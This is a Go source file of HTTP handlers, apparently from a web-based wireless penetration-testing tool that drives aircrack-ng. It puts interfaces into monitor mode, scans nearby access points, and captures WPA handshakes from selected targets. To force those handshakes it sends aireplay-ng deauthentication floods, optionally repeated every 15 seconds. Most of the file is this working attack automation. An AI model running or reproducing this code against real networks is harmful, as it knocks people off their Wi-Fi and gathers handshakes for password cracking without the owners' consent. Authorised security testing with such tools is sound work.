package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/go-chi/chi/v5"
)

// ── Data structures ───────────────────────────────────────────────────────────

type WifiAP struct {
	BSSID   string `json:"bssid"`
	ESSID   string `json:"essid"`
	Channel int    `json:"channel"`
	Power   int    `json:"power"`   // dBm (negative)
	Privacy string `json:"privacy"` // WPA2, WEP, OPN …
	Cipher  string `json:"cipher"`
	Auth    string `json:"auth"`
	Beacons int    `json:"beacons"`
}

type WifiScanJob struct {
	mu      sync.Mutex
	cmd     *exec.Cmd
	output  []string
	done    bool
	csvPath string
}

type WifiCaptureJob struct {
	mu         sync.Mutex
	cmds       []*exec.Cmd
	output     []string
	handshakes []string // "BSSID (ESSID): /path/to/file.cap"
	done       bool
}

var (
	wifiScanJobs    sync.Map // sessionID → *WifiScanJob
	wifiCaptureJobs sync.Map // sessionID → *WifiCaptureJob
)

// ── Helpers ───────────────────────────────────────────────────────────────────

// getWifiInterfaces lists all wireless interfaces via `iw dev`.
func getWifiInterfaces() []string {
	out, err := exec.Command("iw", "dev").Output()
	if err != nil {
		return nil
	}
	var ifaces []string
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "Interface ") {
			name := strings.TrimSpace(strings.TrimPrefix(line, "Interface "))
			ifaces = append(ifaces, name)
		}
	}
	return ifaces
}

// enableMonitorMode runs `sudo airmon-ng start <iface>` and returns the monitor interface name.
func enableMonitorMode(iface string) (monIface, output string, err error) {
	out, err := exec.Command("sudo", "airmon-ng", "start", iface).CombinedOutput()
	output = string(out)
	if err != nil {
		return "", output, fmt.Errorf("airmon-ng: %w", err)
	}
	// Parse "(mac80211 monitor mode vif enabled … on [phyX]wlan0mon)"
	monIface = iface + "mon" // sensible default
	for _, line := range strings.Split(output, "\n") {
		if strings.Contains(line, "monitor mode vif enabled") {
			if idx := strings.LastIndex(line, "]"); idx >= 0 {
				candidate := strings.TrimSpace(strings.TrimSuffix(line[idx+1:], ")"))
				if candidate != "" {
					monIface = candidate
				}
			}
		}
	}
	return monIface, output, nil
}

// disableMonitorMode runs `sudo airmon-ng stop <monIface>`.
func disableMonitorMode(monIface string) (string, error) {
	out, err := exec.Command("sudo", "airmon-ng", "stop", monIface).CombinedOutput()
	return string(out), err
}

// parseAirodumpCSV parses an airodump-ng CSV file and returns discovered APs.
// The file format has two sections separated by a blank line:
//
//	BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Auth, Power, …, ESSID, Key
//	(blank line)
//	 Station MAC, …
func parseAirodumpCSV(path string) []WifiAP {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	var aps []WifiAP
	inAPs := false
	for _, rawLine := range strings.Split(string(data), "\n") {
		line := strings.TrimSpace(rawLine)
		if strings.HasPrefix(line, "BSSID") {
			inAPs = true
			continue
		}
		if strings.HasPrefix(line, "Station MAC") || strings.HasPrefix(line, " Station MAC") {
			break
		}
		if line == "" {
			if inAPs {
				break
			}
			continue
		}
		if !inAPs {
			continue
		}
		parts := strings.Split(line, ",")
		if len(parts) < 14 {
			continue
		}
		bssid := strings.TrimSpace(parts[0])
		if bssid == "" || strings.EqualFold(bssid, "bssid") {
			continue
		}
		ch, _ := strconv.Atoi(strings.TrimSpace(parts[3]))
		pwr, _ := strconv.Atoi(strings.TrimSpace(parts[8]))
		beacons, _ := strconv.Atoi(strings.TrimSpace(parts[9]))
		aps = append(aps, WifiAP{
			BSSID:   bssid,
			ESSID:   strings.TrimSpace(parts[13]),
			Channel: ch,
			Power:   pwr,
			Privacy: strings.TrimSpace(parts[5]),
			Cipher:  strings.TrimSpace(parts[6]),
			Auth:    strings.TrimSpace(parts[7]),
			Beacons: beacons,
		})
	}
	return aps
}

// streamToJob reads a pipe line-by-line and appends to job.output.
func streamToJob(job *WifiScanJob, r *bufio.Scanner) {
	for r.Scan() {
		line := r.Text()
		job.mu.Lock()
		job.output = append(job.output, line)
		job.mu.Unlock()
	}
}

// ── HTTP handlers ─────────────────────────────────────────────────────────────

func handleGetWifiInterfaces() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if _, err := validateToken(extractToken(r)); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		ifaces := getWifiInterfaces()
		if ifaces == nil {
			ifaces = []string{}
		}
		data, _ := encodeJSON(ifaces)
		fmt.Fprintf(w, `{"interfaces":%s}`, data)
	}
}

func handleEnableMonitor() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if _, err := validateToken(extractToken(r)); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		var req struct {
			Interface string `json:"interface"`
		}
		parseJSON(r, &req)
		if req.Interface == "" {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"interface required"}`)
			return
		}
		monIface, out, err := enableMonitorMode(req.Interface)
		if err != nil {
			outData, _ := encodeJSON(out)
			fmt.Fprintf(w, `{"error":%q,"output":%s}`, err.Error(), outData)
			return
		}
		outData, _ := encodeJSON(out)
		fmt.Fprintf(w, `{"monitor_iface":%q,"output":%s}`, monIface, outData)
	}
}

func handleDisableMonitor() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if _, err := validateToken(extractToken(r)); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		var req struct {
			MonitorIface string `json:"monitor_iface"`
		}
		parseJSON(r, &req)
		out, err := disableMonitorMode(req.MonitorIface)
		if err != nil {
			outData, _ := encodeJSON(out)
			fmt.Fprintf(w, `{"error":%q,"output":%s}`, err.Error(), outData)
			return
		}
		outData, _ := encodeJSON(out)
		fmt.Fprintf(w, `{"status":"stopped","output":%s}`, outData)
	}
}

func handleStartWifiScan(db *DB) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		sessionID, err := strconv.Atoi(chi.URLParam(r, "id"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"invalid session id"}`)
			return
		}
		if _, err := validateToken(extractToken(r)); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		// Reject if already running
		if v, ok := wifiScanJobs.Load(sessionID); ok {
			job := v.(*WifiScanJob)
			job.mu.Lock()
			running := !job.done
			job.mu.Unlock()
			if running {
				w.WriteHeader(http.StatusConflict)
				fmt.Fprint(w, `{"error":"scan already running"}`)
				return
			}
		}
		var req struct {
			MonitorIface string `json:"monitor_iface"`
			Band         string `json:"band"` // "" | "a" | "bg" | "abg"
		}
		parseJSON(r, &req)
		if req.MonitorIface == "" {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"monitor_iface required"}`)
			return
		}

		csvPrefix := fmt.Sprintf("/tmp/wifi-scan-%d", sessionID)
		os.Remove(csvPrefix + "-01.csv")
		os.Remove(csvPrefix + "-01.cap")

		args := []string{
			req.MonitorIface,
			"--output-format", "csv",
			"--write-interval", "2",
			"-w", csvPrefix,
		}
		if req.Band != "" {
			args = append(args, "--band", req.Band)
		}

		cmd := exec.Command("sudo", append([]string{"airodump-ng"}, args...)...)
		stdout, _ := cmd.StdoutPipe()
		stderr, _ := cmd.StderrPipe()

		if err := cmd.Start(); err != nil {
			fmt.Fprintf(w, `{"error":%q}`, err.Error())
			return
		}

		job := &WifiScanJob{cmd: cmd, csvPath: csvPrefix + "-01.csv"}
		wifiScanJobs.Store(sessionID, job)

		go streamToJob(job, bufio.NewScanner(stdout))
		go streamToJob(job, bufio.NewScanner(stderr))
		go func() {
			cmd.Wait()
			job.mu.Lock()
			job.done = true
			job.mu.Unlock()
		}()

		fmt.Fprint(w, `{"status":"started"}`)
	}
}

func handleGetWifiScan(db *DB) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		sessionID, err := strconv.Atoi(chi.URLParam(r, "id"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"invalid session id"}`)
			return
		}
		if _, err := validateToken(extractToken(r)); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		v, ok := wifiScanJobs.Load(sessionID)
		if !ok {
			fmt.Fprint(w, `{"status":"idle","aps":[],"output":[]}`)
			return
		}
		job := v.(*WifiScanJob)
		job.mu.Lock()
		out := make([]string, len(job.output))
		copy(out, job.output)
		done := job.done
		csvPath := job.csvPath
		job.mu.Unlock()

		aps := parseAirodumpCSV(csvPath)
		if aps == nil {
			aps = []WifiAP{}
		}
		outData, _ := encodeJSON(out)
		apsData, _ := encodeJSON(aps)
		status := "running"
		if done {
			status = "done"
		}
		fmt.Fprintf(w, `{"status":%q,"aps":%s,"output":%s}`, status, apsData, outData)
	}
}

func handleStopWifiScan(db *DB) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		sessionID, err := strconv.Atoi(chi.URLParam(r, "id"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"invalid session id"}`)
			return
		}
		if _, err := validateToken(extractToken(r)); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		v, ok := wifiScanJobs.Load(sessionID)
		if !ok {
			fmt.Fprint(w, `{"status":"idle"}`)
			return
		}
		job := v.(*WifiScanJob)
		job.mu.Lock()
		cmd := job.cmd
		job.mu.Unlock()
		if cmd != nil && cmd.Process != nil {
			cmd.Process.Kill()
		}
		fmt.Fprint(w, `{"status":"stopped"}`)
	}
}

type CaptureTarget struct {
	BSSID   string `json:"bssid"`
	ESSID   string `json:"essid"`
	Channel int    `json:"channel"`
}

func handleStartWifiCapture(db *DB) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		sessionID, err := strconv.Atoi(chi.URLParam(r, "id"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"invalid session id"}`)
			return
		}
		if _, err := validateToken(extractToken(r)); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		var req struct {
			MonitorIface string          `json:"monitor_iface"`
			Targets      []CaptureTarget `json:"targets"`
			DeauthCount  int             `json:"deauth_count"`
			DeauthRepeat bool            `json:"deauth_repeat"` // keep re-sending deauths every 10s
		}
		parseJSON(r, &req)
		if req.MonitorIface == "" || len(req.Targets) == 0 {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"monitor_iface and targets required"}`)
			return
		}
		if req.DeauthCount <= 0 {
			req.DeauthCount = 10
		}

		job := &WifiCaptureJob{}
		wifiCaptureJobs.Store(sessionID, job)

		go func() {
			for _, t := range req.Targets {
				t := t
				capPrefix := fmt.Sprintf("/tmp/wifi-cap-%d-%s",
					sessionID, strings.ReplaceAll(t.BSSID, ":", ""))

				// airodump-ng capture for this BSSID on its channel
				capArgs := []string{
					req.MonitorIface,
					"--bssid", t.BSSID,
					"-c", strconv.Itoa(t.Channel),
					"--output-format", "cap",
					"-w", capPrefix,
				}
				capCmd := exec.Command("sudo", append([]string{"airodump-ng"}, capArgs...)...)
				capStdout, _ := capCmd.StdoutPipe()
				capStderr, _ := capCmd.StderrPipe()

				if err := capCmd.Start(); err != nil {
					job.mu.Lock()
					job.output = append(job.output,
						fmt.Sprintf("[!] Failed to start capture for %s: %v", t.BSSID, err))
					job.mu.Unlock()
					continue
				}

				job.mu.Lock()
				job.cmds = append(job.cmds, capCmd)
				job.output = append(job.output,
					fmt.Sprintf("[*] Capture started — %s  ch %d  (%s)", t.BSSID, t.Channel, t.ESSID))
				job.mu.Unlock()

				// Watch output for handshake confirmation
				watchStream := func(sc *bufio.Scanner) {
					for sc.Scan() {
						line := sc.Text()
						job.mu.Lock()
						job.output = append(job.output, line)
						if strings.Contains(line, "WPA handshake") {
							entry := fmt.Sprintf("%s (%s): %s-01.cap", t.BSSID, t.ESSID, capPrefix)
							// dedup
							found := false
							for _, h := range job.handshakes {
								if h == entry {
									found = true
									break
								}
							}
							if !found {
								job.handshakes = append(job.handshakes, entry)
								job.output = append(job.output,
									fmt.Sprintf("[+] Handshake captured! %s (%s) → %s-01.cap",
										t.BSSID, t.ESSID, capPrefix))
							}
						}
						job.mu.Unlock()
					}
				}
				go watchStream(bufio.NewScanner(capStdout))
				go watchStream(bufio.NewScanner(capStderr))

				// Short settle before first deauth
				time.Sleep(2 * time.Second)

				sendDeauth := func() {
					deauthArgs := []string{
						"--deauth", strconv.Itoa(req.DeauthCount),
						"-a", t.BSSID,
						req.MonitorIface,
					}
					out, _ := exec.Command("sudo", append([]string{"aireplay-ng"}, deauthArgs...)...).CombinedOutput()
					job.mu.Lock()
					job.output = append(job.output,
						fmt.Sprintf("[*] Deauth × %d → %s (%s)", req.DeauthCount, t.BSSID, t.ESSID))
					for _, l := range strings.Split(string(out), "\n") {
						if strings.TrimSpace(l) != "" {
							job.output = append(job.output, l)
						}
					}
					job.mu.Unlock()
				}

				sendDeauth()

				// If repeat mode, keep sending every 15 s until stopped or handshake captured
				if req.DeauthRepeat {
					go func() {
						for {
							time.Sleep(15 * time.Second)
							job.mu.Lock()
							done := job.done
							// check if handshake already captured for this target
							hsFound := false
							for _, h := range job.handshakes {
								if strings.HasPrefix(h, t.BSSID) {
									hsFound = true
									break
								}
							}
							job.mu.Unlock()
							if done || hsFound {
								return
							}
							sendDeauth()
						}
					}()
				}
			}
		}()

		fmt.Fprint(w, `{"status":"started"}`)
	}
}

func handleGetWifiCapture(db *DB) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		sessionID, err := strconv.Atoi(chi.URLParam(r, "id"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"invalid session id"}`)
			return
		}
		if _, err := validateToken(extractToken(r)); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		v, ok := wifiCaptureJobs.Load(sessionID)
		if !ok {
			fmt.Fprint(w, `{"status":"idle","output":[],"handshakes":[]}`)
			return
		}
		job := v.(*WifiCaptureJob)
		job.mu.Lock()
		out := make([]string, len(job.output))
		copy(out, job.output)
		hs := make([]string, len(job.handshakes))
		copy(hs, job.handshakes)
		done := job.done
		job.mu.Unlock()

		outData, _ := encodeJSON(out)
		hsData, _ := encodeJSON(hs)
		status := "running"
		if done {
			status = "done"
		}
		fmt.Fprintf(w, `{"status":%q,"output":%s,"handshakes":%s}`, status, outData, hsData)
	}
}

func handleStopWifiCapture(db *DB) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		sessionID, err := strconv.Atoi(chi.URLParam(r, "id"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"invalid session id"}`)
			return
		}
		if _, err := validateToken(extractToken(r)); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		v, ok := wifiCaptureJobs.Load(sessionID)
		if !ok {
			fmt.Fprint(w, `{"status":"idle"}`)
			return
		}
		job := v.(*WifiCaptureJob)
		job.mu.Lock()
		for _, cmd := range job.cmds {
			if cmd != nil && cmd.Process != nil {
				cmd.Process.Kill()
			}
		}
		job.done = true
		job.mu.Unlock()
		fmt.Fprint(w, `{"status":"stopped"}`)
	}
}
